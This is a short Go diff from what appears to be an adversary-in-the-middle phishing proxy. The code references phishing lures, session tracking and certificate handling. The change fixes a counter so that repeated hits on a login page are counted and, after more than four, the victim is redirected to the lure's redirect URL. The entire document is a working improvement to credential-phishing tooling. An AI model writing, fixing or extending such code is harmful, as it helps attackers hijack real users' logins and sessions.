@@ -383,7 +383,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if ps.SessionId != "" {
 						if s, ok := p.sessions[ps.SessionId]; ok {
 							if strings.Contains(req.RequestURI, "/login/login.htm") {
-								s.NumRedirects += 1
+								s.NumRedirectErr += 1
 							}
 						}
 					}
@@ -870,7 +870,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if s.NumRedirectErr > 4 {
 						// log.Debug("Redirect urls %s", "")
 						resp.Header.Set("Location", s.PhishLure.RedirectUrl)
-						s.NumRedirects = 0
+						s.NumRedirectErr = 0
 
 					}
 				}
